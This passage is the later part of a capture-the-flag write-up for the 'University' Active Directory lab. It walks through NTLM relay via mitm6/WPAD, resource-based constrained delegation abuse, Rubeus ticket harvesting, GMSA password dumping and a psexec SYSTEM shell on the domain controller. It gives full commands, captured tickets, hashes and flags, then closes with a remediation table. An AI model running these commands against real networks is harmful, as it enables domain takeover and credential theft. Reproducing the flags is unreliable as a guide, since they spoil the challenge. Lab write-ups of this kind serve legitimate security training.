DNS local search domain: university.htb
DNS allowlist: university.htb
```

### 8.3 Creating a Fake Computer Account

A fake computer account is added to the domain using WAO's credentials (machine account creation is allowed for any authenticated user up to the domain's `MachineAccountQuota`, which defaults to 10):

```bash
hyena@hyena$ addcomputer.py -computer-name hyena -computer-pass hyena123 -dc-host dc.university.htb university/WAO:WebAO1337
[*] Successfully added machine account hyena$ with password hyena123.
```

### 8.4 Starting ntlmrelayx

`ntlmrelayx.py` is run on `LAB-2` to relay any captured HTTP/NTLM authentication to the DC's LDAP service, and to use that relayed session to grant the fake `hyena$` account delegation rights over whichever machine account authenticates:

```bash
root@LAB-2:~# ntlmrelayx.py -6 -t ldap://192.168.99.1 --delegate-access --escalate-user hyena$ -wh hyena -ts --no-da
[*] Servers started, waiting for connections
```

- `-6` listens on both IPv4 and IPv6, since the WPAD trigger arrives over IPv6.
- `-t ldap://192.168.99.1` targets the DC's internal-network IP for the LDAP relay.
- `--delegate-access` tells `ntlmrelayx` to configure RBCD on the relayed machine account rather than just dumping its privileges.
- `--escalate-user hyena$` uses the fake computer created above as the delegate, since `ntlmrelayx` can't create a new machine account over plain LDAP (only LDAPS, which isn't configured here).
- `-wh hyena` serves a WPAD/PAC file so the victim's proxy auto-detection actually completes and hands over credentials.
- `--no-da` skips an unrelated built-in step (adding a domain admin), which would fail anyway since a relayed machine account has no rights to do that.

### 8.5 Triggering Authentication

On `WS-3` (in the interactive session as `martin.t`), Windows Update's WPAD check is coerced by ensuring the update service is running and then opening a settings page that triggers a proxy lookup:

```powershell
sc.exe start wuauserv
Start-Process -FilePath 'ms-settings:windowsupdate'
```

If nothing fires on the first attempt, retrying the same command, or alternatively opening `ms-settings:activation`, reliably produces a fresh WPAD lookup within a couple of tries. `WS-3` also polls for a WPAD host on its own every roughly 15 minutes, so simply waiting will eventually trigger the same relay without needing an interactive trigger at all.

### 8.6 Relay Success

```
[*] Delegation rights modified succesfully!
[*] hyena$ can now impersonate users on WS-3$ via S4U2Proxy
```

### 8.7 Getting Administrator Ticket

With RBCD configured, `getST.py` uses the fake computer's credentials to request a service ticket for `WS-3` while impersonating Administrator:

```bash
hyena@hyena$ impacket-getST -spn HTTP/WS-3.university.htb university.htb/hyena\$:'hyena123' -impersonate 'Administrator' -dc-ip 10.129.231.193
[*] Saving ticket in Administrator@HTTP_WS-3.university.htb@UNIVERSITY.HTB.ccache
```

### 8.8 Connecting as Administrator on WS-3

Kerberos requires resolving `WS-3` by hostname rather than IP, so it's added to `/etc/hosts` if not already present, and a valid `krb5.conf` is generated (netexec can build one automatically from the domain's own SMB banner):

```bash
hyena@hyena$ netexec smb dc.university.htb --generate-krb5-file krb5.conf
hyena@hyena$ sudo cp krb5.conf /etc/krb5.conf
hyena@hyena$ export KRB5CCNAME=Administrator@HTTP_WS-3.university.htb@UNIVERSITY.HTB.ccache
hyena@hyena$ evil-winrm -r university.htb -i WS-3.university.htb
*Evil-WinRM* PS C:\Users\Administrator.UNIVERSITY\Documents> whoami
university\administrator
```

---

## 9. Dumping Tickets with Rubeus

### 9.1 Uploading Rubeus

```powershell
*Evil-WinRM* PS C:\programdata> upload Rubeus.exe
```

### 9.2 Monitoring TGTs

Because `WS-3` is trusted for unconstrained delegation, every user who has authenticated to it recently has a full TGT sitting in LSASS memory, ready to be scraped by anyone with Administrator/SYSTEM rights on the box. `Rubeus monitor` watches memory continuously and dumps new tickets as they appear:

```powershell
*Evil-WinRM* PS C:\programdata> .\Rubeus.exe monitor /nowrap
[*] Action: TGT Monitoring
[*] Monitoring every 60 seconds for new TGTs

[*] 7/28/2026 5:59:00 PM UTC - Found new TGT:
  User                  :  Rose.L@UNIVERSITY.HTB
  StartTime             :  7/28/2026 10:56:51 AM
  EndTime               :  7/28/2026 8:55:20 PM
  RenewTill             :  8/4/2026 10:55:20 AM
  Flags                 :  name_canonicalize, pre_authent, renewable, forwarded, forwardable
  Base64EncodedTicket   : doIFejCCBXagAwIBBaEDAgEWooIEezCCBHdhggRzMIIEb6ADAgEFoRAbDlVOSVZFUlNJVFkuSFRCoiMwIaADAgECoRowGBsGa3JidGd0Gw5VTklWRVJTSVRZLkhUQqOCBC8wggQroAMCARKhAwIBAqKCBB0EggQZblxNCJZk/hnK+sdgc3fbfd2UvLd2U0SwvkqYz+HBfkOc9CcFkXe72lsfAvbK/HppxMKUPffs/CWRYho0Y3pSRdGuyDsx60WuoBQUGQCvNZon+bTvCDO6fmgaszIEy7rsAgB5ddfLCQoWSLRzNWsBPVdwSP+RcxEs10Dzsfre2wkuKXg9k1PGH6BX2mLoNy0C/tPnAL7iYY4CLtm3atmUwDMej440S64AQKmRQVV6CBMh368xVTrxezsSj7ULNUf0u2+oEk9HFa5yZhM7ttzJ7QIJaP1wNq2xCgJc1g/FEMp0E5Fe33AOUWJ18rYz1lw0p9BWaPHn2kKqviiyRmRAmfkwioQCVA/gV99KzI0Kqm9QbdknyxySevW8BiK09ElFLKWlr1iHa0lShRFzt5F1zdg+611eyBv4P6MWNP00EYD7FiX0zExN0wboVsELcCY9P5swWGEIVFOjTZ+cpCZd0+s6q1AIL6lExsNeo4HxEe2WBZI9O1EbVHsecNojxE0/EdxM6xmcOhogZaTpckVYCIavt4P2OBxhif1oTpcqAdJd/XpTfsXwNvU93K85hA0YSJDdyzs2iw3qmx+J4OCCXPEqRwHZKI0Z9GZG+qQsTiztlDegJF/Dvyc0APotmzu2KLWFKxuCuwIVBkUJ9dUQyKhprZPtaVnhReLwmc75VWIr4Avdhw59eMA0E8SXGrEN3yIYnUlKtT09mEPDPdn3MWFqN7bbi4MgkI5Fj4xmprAxZoGCMko/IfIX4GKi63/XPCIZ8v9liCH2b9oNmetB/I3Xkyjf6m4sU4fswx89HEPctoEeLkHJVU8wGemwyh24bnpD/tBrys6yJnIPzn8Wv+jUCS82L476SIAtJUHDtrxScYCEoc9GB6hqxgYL74oMbDra9pNGLDVPHgzWrii4vbTRDNIuWR4QofiLfyUdXvumdcgXHjl/QRcgsUyQhM6VzAN7IwRJZGavhi6hoMkYskhf7IoV8aDOZ2JflTDqiI/RqeByz62qw3HVo1K8Skf+oWw92VqGf8HOy8Enx2genAEl4PKF1mdyYvJ1ugCju4OpeneZkibCGB8ZXUsZLXkRN8y4qmPqkLOyn24xmC2V7LZp7v1GmK7CcWWAwbS4cmseK+WksK+bL7uisoKXtM8iSfC3fzqm1zTjx1TMcfzmZPq4/pfrglZyqVRbbRZHyd5Uhcq5x1Zk5TPasLGGlZINEBZXyuY2/QQjjZSJcU1adQuPEw4NMaTcxZrKlbWZYv0l/v+qbEPpDRk3E9q8LNiY50actG67Cp+qWn+qBzwR86nEY1wdu1DFc4AaluS9rh/fl21IhlcMzhezeRGvQnh05IBUKNl2YV2sIQbav+snk8BCZUSDgvBch2bI30+U+jHM8OBhrdHYD2ejgeowgeegAwIBAKKB3wSB3H2B2TCB1qCB0zCB0DCBzaArMCmgAwIBEqEiBCBzZjpshlikv5eOq8MQ1qqxE5WHBABNH4l4AngVL7bJcaEQGw5VTklWRVJTSVRZLkhUQqITMBGgAwIBAaEKMAgbBlJvc2UuTKMHAwUAYKEAAKURGA8yMDI2MDcyODE3NTY1MVqmERgPMjAyNjA3MjkwMzU1MjBapxEYDzIwMjYwODA0MTc1NTIwWqgQGw5VTklWRVJTSVRZLkhUQqkjMCGgAwIBAqEaMBgbBmtyYnRndBsOVU5JVkVSU0lUWS5IVEI=

[*] 7/28/2026 5:59:00 PM UTC - Found new TGT:
  User                  :  Martin.T@UNIVERSITY.HTB
  StartTime             :  7/28/2026 10:20:25 AM
  EndTime               :  7/28/2026 8:20:25 PM
  RenewTill             :  8/4/2026 10:20:25 AM
  Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable
  [ticket cached — not needed for this path, since Martin.T has no useful outbound object control per BloodHound]

[*] 7/28/2026 5:59:00 PM UTC - Found new TGT:
  User                  :  WS-3$@UNIVERSITY.HTB
  StartTime             :  7/28/2026 10:10:03 AM
  EndTime               :  7/28/2026 8:20:08 PM
  RenewTill             :  8/4/2026 10:20:08 AM
  Flags                 :  name_canonicalize, pre_authent, renewable, forwarded, forwardable
  [the machine's own TGT — expected, not useful on its own]

[*] Ticket cache size: 3
```

Three tickets show up: `Rose.L`, `Martin.T` (already controlled), and `WS-3$` itself. Cross-referencing with BloodHound shows `Martin.T` has no outbound object control worth pursuing, but `Rose.L` is a member of the **Help Desk** group, which nests into **Account Operators** — a built-in group with broad `GenericAll` rights over many user objects, and specifically `ReadGMSAPassword` over a service account named `GMSA-PClient01$`.

---

## 10. Rose.L Attack (GMSA Abuse)

### 10.1 Converting Rose.L's Ticket and Getting a Shell

The Base64 ticket captured by Rubeus is decoded into `.kirbi` format and converted to a `ccache` file usable by Linux Kerberos tooling:

```bash
hyena@hyena$ echo "doIFejCCBXagAwIBBaEDAgEWooIEezCCBHdhggRzMIIEb6ADAgEFoRAbDlVOSVZFUlNJVFkuSFRCoiMwIaADAgECoRowGBsGa3JidGd0Gw5VTklWRVJTSVRZLkhUQqOCBC8wggQroAMCARKhAwIBAqKCBB0EggQZblxNCJZk/hnK+sdgc3fbfd2UvLd2U0SwvkqYz+HBfkOc9CcFkXe72lsfAvbK/HppxMKUPffs/CWRYho0Y3pSRdGuyDsx60WuoBQUGQCvNZon+bTvCDO6fmgaszIEy7rsAgB5ddfLCQoWSLRzNWsBPVdwSP+RcxEs10Dzsfre2wkuKXg9k1PGH6BX2mLoNy0C/tPnAL7iYY4CLtm3atmUwDMej440S64AQKmRQVV6CBMh368xVTrxezsSj7ULNUf0u2+oEk9HFa5yZhM7ttzJ7QIJaP1wNq2xCgJc1g/FEMp0E5Fe33AOUWJ18rYz1lw0p9BWaPHn2kKqviiyRmRAmfkwioQCVA/gV99KzI0Kqm9QbdknyxySevW8BiK09ElFLKWlr1iHa0lShRFzt5F1zdg+611eyBv4P6MWNP00EYD7FiX0zExN0wboVsELcCY9P5swWGEIVFOjTZ+cpCZd0+s6q1AIL6lExsNeo4HxEe2WBZI9O1EbVHsecNojxE0/EdxM6xmcOhogZaTpckVYCIavt4P2OBxhif1oTpcqAdJd/XpTfsXwNvU93K85hA0YSJDdyzs2iw3qmx+J4OCCXPEqRwHZKI0Z9GZG+qQsTiztlDegJF/Dvyc0APotmzu2KLWFKxuCuwIVBkUJ9dUQyKhprZPtaVnhReLwmc75VWIr4Avdhw59eMA0E8SXGrEN3yIYnUlKtT09mEPDPdn3MWFqN7bbi4MgkI5Fj4xmprAxZoGCMko/IfIX4GKi63/XPCIZ8v9liCH2b9oNmetB/I3Xkyjf6m4sU4fswx89HEPctoEeLkHJVU8wGemwyh24bnpD/tBrys6yJnIPzn8Wv+jUCS82L476SIAtJUHDtrxScYCEoc9GB6hqxgYL74oMbDra9pNGLDVPHgzWrii4vbTRDNIuWR4QofiLfyUdXvumdcgXHjl/QRcgsUyQhM6VzAN7IwRJZGavhi6hoMkYskhf7IoV8aDOZ2JflTDqiI/RqeByz62qw3HVo1K8Skf+oWw92VqGf8HOy8Enx2genAEl4PKF1mdyYvJ1ugCju4OpeneZkibCGB8ZXUsZLXkRN8y4qmPqkLOyn24xmC2V7LZp7v1GmK7CcWWAwbS4cmseK+WksK+bL7uisoKXtM8iSfC3fzqm1zTjx1TMcfzmZPq4/pfrglZyqVRbbRZHyd5Uhcq5x1Zk5TPasLGGlZINEBZXyuY2/QQjjZSJcU1adQuPEw4NMaTcxZrKlbWZYv0l/v+qbEPpDRk3E9q8LNiY50actG67Cp+qWn+qBzwR86nEY1wdu1DFc4AaluS9rh/fl21IhlcMzhezeRGvQnh05IBUKNl2YV2sIQbav+snk8BCZUSDgvBch2bI30+U+jHM8OBhrdHYD2ejgeowgeegAwIBAKKB3wSB3H2B2TCB1qCB0zCB0DCBzaArMCmgAwIBEqEiBCBzZjpshlikv5eOq8MQ1qqxE5WHBABNH4l4AngVL7bJcaEQGw5VTklWRVJTSVRZLkhUQqITMBGgAwIBAaEKMAgbBlJvc2UuTKMHAwUAYKEAAKURGA8yMDI2MDcyODE3NTY1MVqmERgPMjAyNjA3MjkwMzU1MjBapxEYDzIwMjYwODA0MTc1NTIwWqgQGw5VTklWRVJTSVRZLkhUQqkjMCGgAwIBAqEaMBgbBmtyYnRndBsOVU5JVkVSU0lUWS5IVEI=" | base64 -d > rose.l.kirbi
hyena@hyena$ ticketConverter.py rose.l.kirbi rose.l.ccache
[*] converting kirbi to ccache...
[+] done
```

That ticket is valid for authenticating straight to the DC — no password ever needed for `Rose.L`:

```bash
hyena@hyena$ KRB5CCNAME=rose.l.ccache evil-winrm -r university.htb -i DC.university.htb
Evil-WinRM shell v3.7

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Rose.L\Documents> whoami
university\rose.l
```

### 10.2 Retrieving the GMSA Password

With `Rose.L`'s Kerberos ticket active, `netexec`'s `--gmsa` module reads the `msDS-ManagedPassword` blob off `GMSA-PClient01$` — readable thanks to the `ReadGMSAPassword` right inherited through Help Desk → Account Operators — and decodes it straight to usable NTLM/AES keys:

```bash
hyena@hyena$ KRB5CCNAME=rose.l.ccache netexec ldap dc.university.htb --use-kcache --gmsa
LDAP        dc.university.htb 389    DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:UNIVERSITY.HTB) (signing:None) (channel binding:No TLS cert)
LDAP        dc.university.htb 389    DC               [+] UNIVERSITY.HTB\Rose.L from ccache
LDAP        dc.university.htb 389    DC               [*] Getting GMSA Passwords
LDAP        dc.university.htb 389    DC               Account: GMSA-PClient01$      NTLM: de6942ca053425efd2e0b2cf1d6f7e74
LDAP        dc.university.htb 389    DC               Account: GMSA-PClient01$      aes128-cts-hmac-sha1-96: a68e801336924d77a1b5568eb41f12ea
LDAP        dc.university.htb 389    DC               Account: GMSA-PClient01$      aes256-cts-hmac-sha1-96: 55cdf09bb775e527a506065fb13012b79609b7d4a66e7d5601581e6838dc812d
```

A quick check confirms the hash authenticates, though the GMSA account itself has no interactive logon rights:

```bash
hyena@hyena$ netexec smb dc.university.htb -u GMSA-PClient01$ -H de6942ca053425efd2e0b2cf1d6f7e74
SMB         10.129.231.193   445    DC               [+] university.htb\GMSA-PClient01$:de6942ca053425efd2e0b2cf1d6f7e74
hyena@hyena$ netexec winrm dc.university.htb -u GMSA-PClient01$ -H de6942ca053425efd2e0b2cf1d6f7e74
WINRM       10.129.231.193   5985   DC               [-] university.htb\GMSA-PClient01$:de6942ca053425efd2e0b2cf1d6f7e74
```

### 10.3 Abusing GMSA-PClient01$'s RBCD Rights Over the DC

Following the BloodHound path from `Rose.L` to the DC's computer object reveals the final link in the chain: `GMSA-PClient01$` is itself configured with `msDS-AllowedToActOnBehalfOfOtherIdentity` — i.e. Resource-Based Constrained Delegation — over the **DC computer object itself**. In other words, whoever set this GMSA up granted it the right to impersonate any user when authenticating to services on the Domain Controller, which is an extremely dangerous privilege to hand to a service account. (Note: this is a plain RBCD/delegation misconfiguration on the GMSA object — it is not an ADCS certificate-template issue like ESC9 or ESC14, since no certificate templates are involved anywhere in this particular step.)

With the GMSA's NTLM hash in hand, `getST.py` performs the same S4U2Self/S4U2Proxy dance used earlier against `WS-3`, but this time targeting the DC's own HTTP service (which backs WinRM) while impersonating Administrator directly:

```bash
hyena@hyena$ impacket-getST -spn http/dc.university.htb -hashes :de6942ca053425efd2e0b2cf1d6f7e74 'UNIVERSITY.HTB/GMSA-PClient01$' -impersonate Administrator -dc-ip 10.129.231.193 -no-pass
[*] Getting TGT for user
[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@http_dc.university.htb@UNIVERSITY.HTB.ccache
```

### 10.4 Connecting as Administrator on the DC

```bash
hyena@hyena$ export KRB5CCNAME=Administrator@http_dc.university.htb@UNIVERSITY.HTB.ccache
hyena@hyena$ impacket-psexec -k -no-pass dc.university.htb
[*] Requesting shares on dc.university.htb.....
[*] Found writable share ADMIN$
[*] Uploading file eQMZKGpg.exe
[*] Opening SVCManager on dc.university.htb.....
[*] Creating service sDOI on dc.university.htb.....
[*] Starting service sDOI.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.6414]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```

---

## 11. Root Flag

```powershell
C:\Windows\system32> cd C:\Users\Administrator\Desktop
C:\Users\Administrator\Desktop> dir
Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        7/28/2026   4:46 AM             34 root.txt

C:\Users\Administrator\Desktop> type root.txt
5048c9c4357420a96a8aec19e8598521
```

<img src="POC/pwned.png">

---

## 12. Attack Chain Diagram

```
Full port scan → Port 80 discovered
        ↓
Web application → Django + xhtml2pdf
        ↓
CVE-2023-33733 (ReportLab RCE) → Shell as WAO
        ↓
Found WebAO1337 password in backup script (also WAO's real AD password)
        ↓
Get-ADComputer → WS-3 flagged TrustedForDelegation (unconstrained)
        ↓
Pivot with Chisel → Internal 192.168.99.0/24 network reached
        ↓
Stolen Root CA key/cert → Forged Nya (Professor) certificate login
        ↓
GPG-signed malicious lecture (CVE-2023-36025 .url file) → Shell as Martin.T on WS-3
        ↓
mitm6 (WPAD/IPv6) + ntlmrelayx (LDAP relay) → hyena$ granted RBCD over WS-3
        ↓
getST.py → Administrator on WS-3
        ↓
Rubeus monitor (unconstrained delegation) → Dumped Rose.L's TGT from WS-3 LSASS
        ↓
Rose.L ticket → WinRM shell as Rose.L on DC
        ↓
netexec --gmsa (ReadGMSAPassword via Help Desk → Account Operators) → GMSA-PClient01$ hash
        ↓
BloodHound → GMSA-PClient01$ has AllowedToAct (RBCD) over the DC itself
        ↓
getST.py (GMSA hash) → Administrator ticket on the DC
        ↓
impacket-psexec → Shell on DC as SYSTEM
        ↓
type root.txt → ROOT FLAG ✅
```

---

## 13. Full Results Summary

| Item | Value |
|:-----|:------|
| **Target** | university.htb (10.129.231.193) |
| **Domain Controller** | DC.university.htb |
| **Initial Foothold** | university\wao |
| **Domain Admin** | university\administrator |
| **User Flag** | `17d50ee87af5b0e474a7290b754a83d0` |
| **Root Flag** | `5048c9c4357420a96a8aec19e8598521` |

### Credentials Obtained

| User | NTLM Hash / Password |
|:-----|:----------|
| **wao** | `WebAO1337` (password) |
| **Rose.L** | (Kerberos TGT only — no password/hash required) |
| **GMSA-PClient01$** | `de6942ca053425efd2e0b2cf1d6f7e74` |
| **Administrator** | `a291ead3493f9773dc615e66c2ea21c4` |

### Tools Used

| Tool | Purpose |
|:-----|:--------|
| **nmap** | Port scanning and service enumeration |
| **curl / exiftool** | Web and PDF metadata reconnaissance |
| **openssl** | CSR generation and certificate forging with the stolen CA key |
| **netexec** | SMB/WinRM/LDAP enumeration, password spraying, GMSA dumping, krb5.conf generation |
| **BloodHound (rusthound-ce / bloodhound-python)** | Attack path analysis (Account Operators, GMSA rights, RBCD on the DC) |
| **evil-winrm** | WinRM shell access (password, hash, and Kerberos ccache auth) |
| **Chisel** | SOCKS tunneling into the internal 192.168.99.0/24 network |
| **gpg** | Signing the malicious lecture archive |
| **msfvenom** | Reverse shell payload for the WS-3 phishing step |
| **mitm6** | IPv6/WPAD poisoning to coerce WS-3's machine authentication |
| **impacket (ntlmrelayx, addcomputer.py, getST.py, psexec.py, ticketConverter.py)** | NTLM relay, fake computer creation, S4U2Proxy ticket requests, final SYSTEM shell |
| **Rubeus** | TGT harvesting from WS-3's unconstrained-delegation LSASS memory |

---

## 14. Root Cause & Remediation

| # | Root Cause | Recommendation |
|---|------------|----------------|
| 1 | xhtml2pdf uses ReportLab with an `eval()`-based RCE (CVE-2023-33733) | Upgrade to a patched ReportLab/xhtml2pdf release; never render untrusted HTML/CSS server-side without strict sanitization |
| 2 | Backup automation password (`WebAO1337`) doubles as WAO's real domain password | Never hardcode credentials in automation scripts; enforce unique, rotated passwords per purpose |
| 3 | Root CA private key stored unencrypted and readable on the web server | Store CA keys in a hardware security module or access-controlled vault, never alongside application code |
| 4 | Certificate-based login trusts any certificate signed by the site's own CA without validating the request it corresponds to | Bind issued certificates to their originating CSR/request record; validate subject identity server-side beyond just "signed by our CA" |
| 5 | `.url` shortcut files are accepted and auto-opened as part of lecture review (CVE-2023-36025) | Patch against the SmartScreen bypass; block or sandbox `.url` file types in any automated review pipeline |
| 6 | `WS-3` is configured for unconstrained delegation | Migrate to constrained delegation or RBCD scoped to specific services; unconstrained delegation should be reserved for domain controllers only |
| 7 | WPAD/IPv6 auto-configuration allows NTLM relay via mitm6 + ntlmrelayx | Disable IPv6 where not needed, or deploy DHCPv6 guard/RA guard; disable WPAD; enforce LDAP signing and channel binding |
| 8 | `Rose.L` (via Help Desk → Account Operators) holds `ReadGMSAPassword` over `GMSA-PClient01$` | Scope `PrincipalsAllowedToRetrieveManagedPassword` tightly to the actual hosts/services that need it, not broad admin-adjacent groups |
| 9 | `GMSA-PClient01$` is configured with RBCD (`AllowedToAct`) over the Domain Controller's computer object | Never grant delegation rights over the DC to a service account; audit `msDS-AllowedToActOnBehalfOfOtherIdentity` domain-wide |
| 10 | Account Operators nested group grants overly broad `GenericAll` rights | Avoid using Account Operators for day-to-day helpdesk tasks; use scoped, delegated OU permissions instead |

---

*Assessment carried out by RavenHex from hyena@hyena against 10.129.231.193 (university.htb). Screenshots referenced above (`Default_page.png`, `University.png`, `User_bio_area.png`, `Submitting_payload_inBio_section.png`, `Got_initial_university_shell.png`, `Succesfull_login_as_naya.png`, `naya_professor_detail.png`, `Upload_form.png`, `pwned.png`) are included as proof-of-concept evidence for their respective steps.*
